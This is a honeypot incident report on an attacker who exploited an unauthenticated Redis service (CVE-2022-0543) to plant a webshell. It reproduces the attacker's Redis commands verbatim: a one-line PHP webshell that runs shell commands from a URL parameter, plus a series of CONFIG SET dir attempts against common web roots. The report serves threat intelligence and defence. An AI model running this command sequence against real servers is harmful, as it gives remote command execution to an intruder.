# Incident: 193.32.249.248

| | |
|---|---|
| Source | `193.32.249.248` |
| Country | unknown |
| First seen | 2026-09-16 23:29:10 UTC |
| Last seen | 2026-09-16 23:32:05 UTC |
| Sessions | 30 |
| Events | 252 |
| Services abused | http, redis |
| Ports | 80, 6379 |
| Classification | malware loader |

## Vulnerabilities targeted

- **CVE-2022-0543**

## Techniques

- `CWE-94` code injection / webshell upload

## Commands executed

Verbatim attacker input. Lyrebird's responses are deliberately not published.

```
CONFIG SET dbfilename sitemap_x.php
SET shell_key "  &lt;?php if(isset($_GET[\"c\"])){echo shell_exec($_GET[\"c\"].\" 2>&1\");} echo \"REDIS_SHL_OK\"; ?>   "
BGSAVE
PING
CONFIG GET dir
CONFIG SET dir /var/www/html
CONFIG SET dir /var/www
CONFIG SET dir /srv/www/htdocs
CONFIG SET dir /usr/share/nginx/html
CONFIG SET dir /opt/lampp/htdocs
CONFIG SET dir /www
CONFIG SET dir /home/www
CONFIG SET dir /var/www/public_html
CONFIG SET dir /var/www/public
```

## Paths requested

```
/sitemap_x.php?c=id
```

## User agents

- `Mozilla/5.0 Chrome/120`

## Samples delivered

| sha256 | size | type |
|---|---|---|
| [`7070c769cd06c9956d8a9b3fbe5f322d1ed6a7da5269e74fc0a4d3fe012fc045`](../../../samples/7070c769cd06c9956d8a9b3fbe5f322d1ed6a7da5269e74fc0a4d3fe012fc045.zip) | 94 B | PHP source (likely webshell) |

Archives are zip-encrypted with the password `infected` — the convention for malware distribution. Handle in an isolated environment.

## Detections

- Redis Unauthenticated RCE Kill Chain (54)

---

Collected by a Lyrebird honeypot operated by [birdo.uk](https://birdo.uk). Generated 2026-09-22 00:13 UTC.

Services are emulated; no real host was compromised. Attacker input is reproduced verbatim and is hostile by definition — do not execute anything recorded here.
